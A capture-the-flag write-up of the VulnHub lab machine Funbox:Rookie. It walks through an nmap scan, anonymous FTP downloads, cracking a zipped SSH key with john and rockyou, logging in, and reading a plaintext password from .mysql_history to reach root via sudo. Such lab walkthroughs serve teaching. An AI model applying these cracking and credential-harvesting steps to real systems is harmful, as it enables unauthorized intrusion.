---
title: Funbox:Rookie - Writeup
author: Elman Alizadeh
date: 2022-06-06 14:00:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, funbox]
---

Today we will take a look at Vulnhub: Funbox:Rookie. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-funbox-rookie/1.png" | relative_url }})

## Nmap

```console
sudo nmap -p- -sCV --open 192.168.220.107

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Ftp

```console
ftp 192.168.220.107

Connected to 192.168.220.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.220.107]
Name (192.168.220.107:al1z4deh): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.49.220 !
230-
230-The local time is: Mon Jun 06 09:18:13 2022
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 .
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..
-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
ftp> mget *
mget jessica.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for jessica.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (564.0919 kB/s)
mget bud.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for bud.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (12.3559 MB/s)
mget marge.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for marge.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (2.0326 MB/s)
mget miriam.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for miriam.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (832.7845 kB/s)
mget homer.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for homer.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (12.0391 MB/s)
mget john.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for john.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (1.6571 MB/s)
mget cathrine.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for cathrine.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (8.5889 MB/s)
mget ariel.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for ariel.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (1.2736 MB/s)
mget anna.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for anna.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (4.8572 MB/s)
mget welcome.msg? 
200 PORT command successful
150 Opening BINARY mode data connection for welcome.msg (170 bytes)
226 Transfer complete
170 bytes received in 0.00 secs (608.1158 kB/s)
mget tom.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (3.5039 MB/s)
mget zlatan.zip? y
200 PORT command successful
150 Opening BINARY mode data connection for zlatan.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (9.3905 MB/s)
ftp> bye
221 Goodbye.
```

## John

```console
$ zip2john tom.zip > hash

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iubire           (tom.zip/id_rsa)     
1g 0:00:00:00 DONE (2022-06-06 13:19) 3.333g/s 27306p/s 27306c/s 27306C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
```

## Ssh

```console
$ unzip tom.zip
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: id_rsa
  
$ chmod 600 id_rsa

$ ssh tom@192.168.220.107 -i id_rsa

tom@funbox2:~$ ls
local.txt

tom@funbox2:~$ script /dev/null -c bash
Script started, file is /dev/null
```

## Root

```console
tom@funbox2:~$ ls -la
total 44
drwxr-xr-x 5 tom  tom  4096 Jun  6 09:13 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom   365 Jun  6 09:17 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Jun  6 09:10 .cache
drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
-rw-r--r-- 1 tom  tom    33 Jun  6 09:00 local.txt
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
-rw-r--r-- 1 tom  tom     0 Jun  6 09:13 .sudo_as_admin_successful

tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
tom@funbox2:~$ sudo -l

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```

![Desktop View]({{ "/assets/img/vuln-funbox-rookie/2.png" | relative_url }})

### And now we are the root

“If you have any questions or comments, please do not hesitate to write. Have a good days”
